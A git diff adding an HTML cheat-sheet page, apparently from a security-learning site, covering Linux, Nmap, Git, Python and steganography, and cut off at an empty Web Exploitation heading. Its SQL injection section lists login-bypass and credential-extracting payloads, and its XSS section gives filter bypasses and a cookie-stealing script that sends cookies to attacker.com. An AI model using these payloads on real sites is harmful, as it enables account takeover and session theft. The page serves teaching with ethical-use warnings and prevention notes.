@@ -1,0 +1,1726 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Cheat Sheets - Quick Reference</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="site.css" />
+    
+  </head>
+  <body>
+    <a href="#main-content" class="skip-link">Skip to content</a>
+    
+    <!-- Professional Header Navigation -->
+    <header class="site-header">
+      <div class="header-container">
+        <div class="logo">
+          <a href="index.html">
+            <span class="logo-bracket">[</span>
+            <span class="logo-text">BEATTIE</span>
+            <span class="logo-bracket">]</span>
+            <span class="logo-subtitle">TECH</span>
+          </a>
+        </div>
+        
+        <button class="mobile-menu-toggle" aria-label="Toggle menu">
+          <span></span>
+          <span></span>
+          <span></span>
+        </button>
+        
+        <nav class="main-nav nav-links">
+          <ul>
+            <li><a href="index.html">🏠 Home</a></li>
+            <li><a href="study-guides.html">📖 Study Guides</a></li>
+            <li><a href="learning-tracks.html">🎯 Learning Tracks</a></li>
+            <li><a href="resources.html">🔬 Study Hub</a></li>
+            <li><a href="cheat-sheets.html" class="active">⚡ Cheat Sheets</a></li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+    
+    <div class="scanlines"></div>
+    
+    <main id="main-content" class="container">
+      <nav class="breadcrumbs">
+        <a href="index.html">Home</a>
+        <span class="separator">/</span>
+        <span class="current">Cheat Sheets</span>
+      </nav>
+      
+      <h1>Cheat Sheets</h1>
+      <div class="subtitle">Quick reference guides for cybersecurity & development</div>
+      
+      <!-- Linux Commands -->
+      <div class="cheat-sheet">
+        <h2>🐧 Linux Terminal Commands</h2>
+        
+        <h3>File & Directory Operations</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">ls -la</code>
+            <div class="card--command__description">List all files (including hidden) with detailed info</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">cd /path/to/directory</code>
+            <div class="card--command__description">Change directory</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">pwd</code>
+            <div class="card--command__description">Print working directory (current location)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">mkdir dirname</code>
+            <div class="card--command__description">Create a new directory</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">rm -rf dirname</code>
+            <div class="card--command__description">Remove directory and contents recursively (DANGEROUS)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">cp source dest</code>
+            <div class="card--command__description">Copy file or directory</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">mv source dest</code>
+            <div class="card--command__description">Move or rename file/directory</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">touch filename</code>
+            <div class="card--command__description">Create empty file or update timestamp</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">cat filename</code>
+            <div class="card--command__description">Display file contents</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">less filename</code>
+            <div class="card--command__description">View file with pagination (press q to quit)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">head -n 20 file</code>
+            <div class="card--command__description">Show first 20 lines of file</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">tail -f logfile</code>
+            <div class="card--command__description">Follow log file in real-time</div>
+          </div>
+        </div>
+        
+        <h3>File Permissions</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">chmod 755 filename</code>
+            <div class="card--command__description">Change permissions (rwxr-xr-x)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">chmod +x script.sh</code>
+            <div class="card--command__description">Make file executable</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">chown user:group file</code>
+            <div class="card--command__description">Change file owner and group</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">sudo command</code>
+            <div class="card--command__description">Run command as superuser</div>
+          </div>
+        </div>
+        
+        <h3>Process Management</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">ps aux</code>
+            <div class="card--command__description">List all running processes</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">top</code>
+            <div class="card--command__description">Real-time process monitor (press q to quit)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">kill -9 PID</code>
+            <div class="card--command__description">Force kill process by ID</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">killall processname</code>
+            <div class="card--command__description">Kill all processes by name</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">bg</code>
+            <div class="card--command__description">Resume suspended job in background</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">fg</code>
+            <div class="card--command__description">Bring background job to foreground</div>
+          </div>
+        </div>
+        
+        <h3>Searching & Finding</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">grep "pattern" file</code>
+            <div class="card--command__description">Search for pattern in file</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">grep -r "text" /path</code>
+            <div class="card--command__description">Recursively search in directory</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">find / -name filename</code>
+            <div class="card--command__description">Find file by name starting from root</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">find . -type f -size +100M</code>
+            <div class="card--command__description">Find files larger than 100MB in current dir</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">which command</code>
+            <div class="card--command__description">Show full path of command</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">whereis program</code>
+            <div class="card--command__description">Locate binary, source, and manual for program</div>
+          </div>
+        </div>
+        
+        <h3>Network Commands</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">ifconfig</code>
+            <div class="card--command__description">Display network interface configuration</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">ip addr show</code>
+            <div class="card--command__description">Show IP addresses (modern alternative to ifconfig)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">ping host</code>
+            <div class="card--command__description">Test network connectivity to host</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">netstat -tuln</code>
+            <div class="card--command__description">Show listening ports and connections</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">ss -tuln</code>
+            <div class="card--command__description">Modern replacement for netstat</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">curl http://example.com</code>
+            <div class="card--command__description">Make HTTP request</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">wget http://example.com/file</code>
+            <div class="card--command__description">Download file from URL</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">nslookup domain.com</code>
+            <div class="card--command__description">DNS lookup</div>
+          </div>
+        </div>
+      </div>
+      
+      <!-- SQL Injection -->
+      <div class="cheat-sheet">
+        <h2>💉 SQL Injection Reference</h2>
+        
+        <div class="warning">
+          <div class="warning-title">⚠️ ETHICAL USE ONLY</div>
+          These techniques are for educational purposes and authorized penetration testing ONLY. 
+          Unauthorized access to computer systems is illegal. Use only on systems you own or have explicit permission to test.
+        </div>
+        
+        <h3>Basic SQL Injection Payloads</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">' OR '1'='1</code>
+            <div class="card--command__description">Classic always-true condition</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">' OR 1=1--</code>
+            <div class="card--command__description">Bypass login with comment</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">admin'--</code>
+            <div class="card--command__description">Login as admin (comments out password check)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">' OR 'a'='a</code>
+            <div class="card--command__description">Alternative always-true</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">" OR "1"="1</code>
+            <div class="card--command__description">For queries using double quotes</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">' OR 1=1#</code>
+            <div class="card--command__description">MySQL comment character</div>
+          </div>
+        </div>
+        
+        <h3>Union-Based Injection</h3>
+        <div class="example-block">
+          <div class="example-title">Example: Extract data from another table</div>
+          <div class="example-code">' UNION SELECT username, password FROM users--
+' UNION SELECT NULL, table_name FROM information_schema.tables--
+' UNION SELECT NULL, column_name FROM information_schema.columns--</div>
+        </div>
+        
+        <h3>Time-Based Blind Injection</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">' OR SLEEP(5)--</code>
+            <div class="card--command__description">Pause execution for 5 seconds (MySQL)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">' OR pg_sleep(5)--</code>
+            <div class="card--command__description">PostgreSQL sleep function</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">' WAITFOR DELAY '0:0:5'--</code>
+            <div class="card--command__description">MS SQL Server delay</div>
+          </div>
+        </div>
+        
+        <h3>Boolean-Based Blind Injection</h3>
+        <div class="example-block">
+          <div class="example-title">Test if conditions are true/false by observing page differences</div>
+          <div class="example-code">' AND 1=1-- (true - page loads normally)
+' AND 1=2-- (false - page changes or errors)
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--</div>
+        </div>
+        
+        <h3>Comment Styles by Database</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">-- (space required)</code>
+            <div class="card--command__description">Standard SQL comment (MySQL, PostgreSQL, MSSQL)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">#</code>
+            <div class="card--command__description">MySQL-specific comment</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">/* comment */</code>
+            <div class="card--command__description">Multi-line comment (all databases)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">;%00</code>
+            <div class="card--command__description">Null byte (sometimes works)</div>
+          </div>
+        </div>
+        
+        <h3>Prevention (For Developers)</h3>
+        <div class="info-box">
+          <strong>Always use parameterized queries / prepared statements:</strong>
+          <div style="margin-top: 10px;">
+            <code>cursor.execute("SELECT * FROM users WHERE username=? AND password=?", [user, pass])</code>
+          </div>
+          <div style="margin-top: 10px;">
+            Never concatenate user input directly into SQL queries!
+          </div>
+        </div>
+      </div>
+      
+      <!-- XSS Payloads -->
+      <div class="cheat-sheet">
+        <h2>⚠️ XSS (Cross-Site Scripting) Payloads</h2>
+        
+        <div class="warning">
+          <div class="warning-title">⚠️ AUTHORIZED TESTING ONLY</div>
+          Only use these on web applications you own or have written permission to test. 
+          Injecting scripts into third-party websites is illegal.
+        </div>
+        
+        <h3>Basic XSS Tests</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
+            <div class="card--command__description">Classic XSS test</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">&lt;img src=x onerror=alert('XSS')&gt;</code>
+            <div class="card--command__description">Image tag with error handler</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">&lt;svg onload=alert('XSS')&gt;</code>
+            <div class="card--command__description">SVG-based XSS</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">&lt;body onload=alert('XSS')&gt;</code>
+            <div class="card--command__description">Body tag event handler</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">&lt;iframe src="javascript:alert('XSS')"&gt;</code>
+            <div class="card--command__description">Iframe with JavaScript URL</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">&lt;input autofocus onfocus=alert('XSS')&gt;</code>
+            <div class="card--command__description">Input with autofocus event</div>
+          </div>
+        </div>
+        
+        <h3>Cookie Stealing</h3>
+        <div class="example-block">
+          <div class="example-title">Payload to exfiltrate session cookies</div>
+          <div class="example-code">&lt;script&gt;
+  fetch('http://attacker.com?cookie=' + document.cookie);
+&lt;/script&gt;
+
+&lt;img src=x onerror="location='http://attacker.com?c='+document.cookie"&gt;</div>
+        </div>
+        
+        <h3>Filter Bypasses</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">&lt;ScRiPt&gt;alert('XSS')&lt;/sCrIpT&gt;</code>
+            <div class="card--command__description">Case variation bypass</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">&lt;script&gt;ale&lt;x&gt;rt('XSS')&lt;/script&gt;</code>
+            <div class="card--command__description">HTML injection within payload</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</code>
+            <div class="card--command__description">Character code encoding</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">&lt;img src=x:alert(1) onerror=eval(src)&gt;</code>
+            <div class="card--command__description">Eval-based execution</div>
+          </div>
+        </div>
+        
+        <h3>Prevention (For Developers)</h3>
+        <div class="info-box">
+          <strong>Key defenses:</strong>
+          <ul style="margin-top: 10px; margin-left: 20px; line-height: 1.8;">
+            <li>Use <code>textContent</code> instead of <code>innerHTML</code></li>
+            <li>Escape HTML entities: &lt; &gt; " ' &</li>
+            <li>Use Content Security Policy (CSP) headers</li>
+            <li>Validate and sanitize all user input</li>
+            <li>Use frameworks with auto-escaping (React, Vue)</li>
+          </ul>
+        </div>
+      </div>
+      
+      <!-- Network Commands -->
+      <div class="cheat-sheet">
+        <h2>🌐 Network Reconnaissance</h2>
+        
+        <h3>Port Scanning (Nmap)</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">nmap target.com</code>
+            <div class="card--command__description">Basic port scan (top 1000 ports)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">nmap -p- target.com</code>
+            <div class="card--command__description">Scan all 65535 ports</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">nmap -sV target.com</code>
+            <div class="card--command__description">Version detection</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">nmap -O target.com</code>
+            <div class="card--command__description">OS detection</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">nmap -sS target.com</code>
+            <div class="card--command__description">SYN stealth scan</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">nmap -A target.com</code>
+            <div class="card--command__description">Aggressive scan (OS, version, scripts)</div>
+          </div>
+        </div>
+        
+        <h3>DNS Enumeration</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">dig example.com</code>
+            <div class="card--command__description">DNS lookup</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">dig example.com MX</code>
+            <div class="card--command__description">Find mail servers</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">dig @8.8.8.8 example.com</code>
+            <div class="card--command__description">Query specific DNS server</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">host example.com</code>
+            <div class="card--command__description">Simple DNS lookup</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">whois example.com</code>
+            <div class="card--command__description">Domain registration information</div>
+          </div>
+        </div>
+        
+        <h3>Packet Analysis</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">tcpdump -i eth0</code>
+            <div class="card--command__description">Capture packets on interface eth0</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">tcpdump -i eth0 port 80</code>
+            <div class="card--command__description">Capture only HTTP traffic</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">tcpdump -w capture.pcap</code>
+            <div class="card--command__description">Save capture to file</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">wireshark</code>
+            <div class="card--command__description">Launch Wireshark GUI for packet analysis</div>
+          </div>
+        </div>
+      </div>
+      
+      <!-- Git Commands -->
+      <div class="cheat-sheet">
+        <h2>📦 Git Version Control</h2>
+        
+        <h3>Basic Operations</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">git init</code>
+            <div class="card--command__description">Initialize new Git repository</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">git clone url</code>
+            <div class="card--command__description">Clone remote repository</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">git status</code>
+            <div class="card--command__description">Show working tree status</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">git add .</code>
+            <div class="card--command__description">Stage all changes</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">git commit -m "message"</code>
+            <div class="card--command__description">Commit staged changes</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">git push origin main</code>
+            <div class="card--command__description">Push commits to remote</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">git pull</code>
+            <div class="card--command__description">Fetch and merge remote changes</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">git log --oneline</code>
+            <div class="card--command__description">View commit history (condensed)</div>
+          </div>
+        </div>
+        
+        <h3>Branching</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">git branch</code>
+            <div class="card--command__description">List branches</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">git branch feature-name</code>
+            <div class="card--command__description">Create new branch</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">git checkout branch-name</code>
+            <div class="card--command__description">Switch to branch</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">git checkout -b new-branch</code>
+            <div class="card--command__description">Create and switch to new branch</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">git merge branch-name</code>
+            <div class="card--command__description">Merge branch into current branch</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">git branch -d branch-name</code>
+            <div class="card--command__description">Delete branch</div>
+          </div>
+        </div>
+        
+        <h3>Undo Changes</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">git reset HEAD~1</code>
+            <div class="card--command__description">Undo last commit (keep changes)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">git reset --hard HEAD~1</code>
+            <div class="card--command__description">Undo last commit (discard changes)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">git checkout -- file</code>
+            <div class="card--command__description">Discard changes to file</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">git revert commit-hash</code>
+            <div class="card--command__description">Create new commit that undoes changes</div>
+          </div>
+        </div>
+      </div>
+      
+      <!-- Python Basics -->
+      <div class="cheat-sheet">
+        <h2>🐍 Python Quick Reference</h2>
+        
+        <h3>Virtual Environments</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">python -m venv venv</code>
+            <div class="card--command__description">Create virtual environment</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">source venv/bin/activate</code>
+            <div class="card--command__description">Activate (Linux/Mac)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">venv\Scripts\activate</code>
+            <div class="card--command__description">Activate (Windows)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">deactivate</code>
+            <div class="card--command__description">Deactivate virtual environment</div>
+          </div>
+        </div>
+        
+        <h3>Package Management</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">pip install package</code>
+            <div class="card--command__description">Install package</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">pip install -r requirements.txt</code>
+            <div class="card--command__description">Install from requirements file</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">pip freeze > requirements.txt</code>
+            <div class="card--command__description">Export installed packages</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">pip list</code>
+            <div class="card--command__description">List installed packages</div>
+          </div>
+        </div>
+        
+        <h3>Common Security Libraries</h3>
+        <div class="example-block">
+          <div class="example-title">Useful Python modules for security work</div>
+          <div class="example-code">import requests      # HTTP requests
+import hashlib       # Hashing algorithms
+import base64        # Base64 encoding/decoding
+import socket        # Network connections
+import subprocess    # Execute shell commands
+from cryptography import fernet  # Encryption</div>
+        </div>
+      </div>
+      
+      <!-- STEGANOGRAPHY -->
+      <div class="section">
+        <h2>🖼️ Steganography Tools</h2>
+        <p style="margin-bottom: 20px; color: #00d4ff;">Tools and techniques for hiding and extracting data from images, audio, and other files.</p>
+        
+        <div class="warning-box">
+          <strong>⚠️ Educational Use Only</strong><br>
+          Use steganography tools only for learning, CTF challenges, or authorized security research. Hiding malicious data in legitimate files can be illegal.
+        </div>
+        
+        <h3>Image Steganography - LSB (Least Significant Bit)</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">steghide embed -cf image.jpg -ef secret.txt</code>
+            <div class="card--command__description">Hide file in JPEG (password required)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">steghide extract -sf image.jpg</code>
+            <div class="card--command__description">Extract hidden file from image</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">steghide info image.jpg</code>
+            <div class="card--command__description">Check if file contains embedded data</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">stegcracker image.jpg wordlist.txt</code>
+            <div class="card--command__description">Brute force steghide password</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">zsteg image.png</code>
+            <div class="card--command__description">Detect hidden data in PNG/BMP (LSB)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">zsteg -a image.png</code>
+            <div class="card--command__description">Try all known methods on PNG</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">stegsolve image.jpg</code>
+            <div class="card--command__description">Visual analysis tool (Java GUI)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">exiftool image.jpg</code>
+            <div class="card--command__description">Extract EXIF metadata from images</div>
+          </div>
+        </div>
+        
+        <h3>File Analysis & Strings</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">strings image.jpg</code>
+            <div class="card--command__description">Extract printable strings from file</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">strings -n 10 image.jpg</code>
+            <div class="card--command__description">Strings with min length 10</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">binwalk image.jpg</code>
+            <div class="card--command__description">Search for embedded files/signatures</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">binwalk -e image.jpg</code>
+            <div class="card--command__description">Extract embedded files automatically</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">foremost -i image.jpg -o output/</code>
+            <div class="card--command__description">Recover hidden files by headers</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">hexdump -C image.jpg | less</code>
+            <div class="card--command__description">View file in hexadecimal format</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">xxd image.jpg | less</code>
+            <div class="card--command__description">Make hexdump with ASCII column</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">file image.jpg</code>
+            <div class="card--command__description">Identify file type (real format)</div>
+          </div>
+        </div>
+        
+        <h3>PNG-Specific Tools</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">pngcheck image.png</code>
+            <div class="card--command__description">Verify PNG integrity and chunks</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">pngcheck -v image.png</code>
+            <div class="card--command__description">Verbose chunk information</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">python3 -c "import png; list(png.Reader('image.png').chunks())"</code>
+            <div class="card--command__description">List PNG chunks (Python)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">tweakpng image.png</code>
+            <div class="card--command__description">Edit PNG chunks (GUI tool)</div>
+          </div>
+        </div>
+        
+        <h3>Audio Steganography</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">steghide embed -cf audio.wav -ef secret.txt</code>
+            <div class="card--command__description">Hide file in WAV audio</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">sonic-visualiser audio.wav</code>
+            <div class="card--command__description">Visual audio analysis (spectrogram)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">audacity audio.wav</code>
+            <div class="card--command__description">Audio editor with spectrogram view</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">sox audio.wav -n spectrogram</code>
+            <div class="card--command__description">Generate spectrogram image</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">deepsound audio.wav</code>
+            <div class="card--command__description">Hide files in audio (Windows tool)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">hideme audio.wav secret.txt</code>
+            <div class="card--command__description">Simple audio stego tool</div>
+          </div>
+        </div>
+        
+        <h3>Advanced Techniques</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">outguess -r image.jpg output.txt</code>
+            <div class="card--command__description">Extract data hidden with OutGuess</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">outguess -k "password" -d secret.txt image.jpg output.jpg</code>
+            <div class="card--command__description">Hide data with OutGuess</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">stegdetect image.jpg</code>
+            <div class="card--command__description">Detect steganography methods used</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">stegbreak -t p -f wordlist.txt image.jpg</code>
+            <div class="card--command__description">Brute force password for detected stego</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">openstego</code>
+            <div class="card--command__description">Java-based stego tool (GUI)</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">stegpy secret.txt image.png</code>
+            <div class="card--command__description">Python LSB steganography tool</div>
+          </div>
+        </div>
+        
+        <h3>QR Codes & Barcodes</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">zbarimg image.png</code>
+            <div class="card--command__description">Decode QR codes and barcodes</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">qrencode -o qr.png "Hidden Message"</code>
+            <div class="card--command__description">Create QR code from text</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">zbarimg --raw image.png</code>
+            <div class="card--command__description">Output only decoded data</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">qr</code>
+            <div class="card--command__description">Decode QR codes (Python CLI tool)</div>
+          </div>
+        </div>
+        
+        <div class="example-block">
+          <div class="example-title">Common Steganography Workflow (CTF Challenge)</div>
+          <div class="example-code"># Step 1: Identify file type
+file suspicious.jpg
+
+# Step 2: Check for embedded files
+binwalk suspicious.jpg
+strings suspicious.jpg | grep -i "flag"
+
+# Step 3: Extract EXIF data
+exiftool suspicious.jpg
+
+# Step 4: Try common stego tools
+steghide info suspicious.jpg
+zsteg suspicious.jpg -a
+
+# Step 5: Visual analysis
+stegsolve suspicious.jpg  # Look at bit planes
+
+# Step 6: If password-protected, brute force
+stegcracker suspicious.jpg rockyou.txt</div>
+        </div>
+        
+        <div class="example-block">
+          <div class="example-title">Python LSB Steganography Example</div>
+          <div class="example-code">from PIL import Image
+
+# Hide text in image LSB
+def hide_text(image_path, text, output_path):
+    img = Image.open(image_path)
+    binary = ''.join(format(ord(c), '08b') for c in text) + '1111111111111110'
+    pixels = list(img.getdata())
+    
+    for i in range(len(binary)):
+        pixel = list(pixels[i])
+        pixel[0] = pixel[0] & ~1 | int(binary[i])
+        pixels[i] = tuple(pixel)
+    
+    img.putdata(pixels)
+    img.save(output_path)
+
+# Extract text from image LSB
+def extract_text(image_path):
+    img = Image.open(image_path)
+    binary = ''
+    
+    for pixel in img.getdata():
+        binary += str(pixel[0] & 1)
+    
+    chars = [chr(int(binary[i:i+8], 2)) for i in range(0, len(binary), 8)]
+    return ''.join(chars).split('\xff')[0]</div>
+        </div>
+        
+        <div class="info-box">
+          <strong>💡 Detection Tips</strong><br>
+          • Always check file signatures (magic bytes) with <code>hexdump</code> or <code>xxd</code><br>
+          • Look for unusual file sizes or aspect ratios<br>
+          • Compare with original/similar files if available<br>
+          • Check for trailing data after EOF markers<br>
+          • Analyze bit planes (LSB patterns often visible)<br>
+          • Try multiple tools - different methods have different strengths<br>
+          • Audio: Look for patterns in spectrograms (hidden images/text)<br>
+          • PNG: Check for extra chunks beyond standard IHDR/IDAT/IEND
+        </div>
+        
+        <div class="info-box">
+          <strong>🔍 Installation Commands</strong><br>
+          • <code>sudo apt install steghide stegcracker</code> - Basic image stego<br>
+          • <code>gem install zsteg</code> - PNG/BMP analysis (Ruby)<br>
+          • <code>sudo apt install binwalk foremost</code> - File carving<br>
+          • <code>pip3 install stegpy pillow</code> - Python stego tools<br>
+          • <code>sudo apt install zbar-tools qrencode</code> - QR/barcode tools<br>
+          • <code>sudo apt install exiftool</code> - Metadata extraction<br>
+          • <code>sudo apt install audacity sonic-visualiser</code> - Audio analysis
+        </div>
+      </div>
+      
+      <!-- CATEGORY EXPANSIONS -->
+      <div class="section">
+        <h2>🌐 Web Exploitation</h2>
+        <p style="margin-bottom: 20px; color: #00d4ff;">Practical exercises, ELI5 explanations, and quick references for common web vulnerabilities.</p>
+        
+        <div class="warning-box">
+          <strong>⚠️ Ethical Use Only</strong><br>
+          Practice these techniques only in labs, CTFs, or systems you are authorized to test.
+        </div>
+        
+        <h3>ELI5: What is Web Exploitation?</h3>
+        <div class="info-box">
+          Imagine a website is a vending machine. Web exploitation is finding the buttons or slots that let you get the wrong snack without paying. Our job is to learn how to spot those weak spots so we can fix them.
+        </div>
+        
+        <h3>Practical Exercises</h3>
+        <div class="card-grid">
+          <div class="card card--command">
+            <code class="card--command__code">Try SQLi in a lab login form</code>
+            <div class="card--command__description">Use known payloads in a safe demo to see bypasses</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Reflected XSS demo</code>
+            <div class="card--command__description">Test how user input is displayed and sanitized</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Auth check bypass</code>
+            <div class="card--command__description">Explore role checks vs. direct URL access</div>
+          </div>
+          <div class="card card--command">
+            <code class="card--command__code">Broken access control</code>
+            <div class="card--command__description">Switch IDs in a URL and observe authorization</div>
+          </div>
+        </div>
+        
+        <h3>Cheat Sheet</h3>
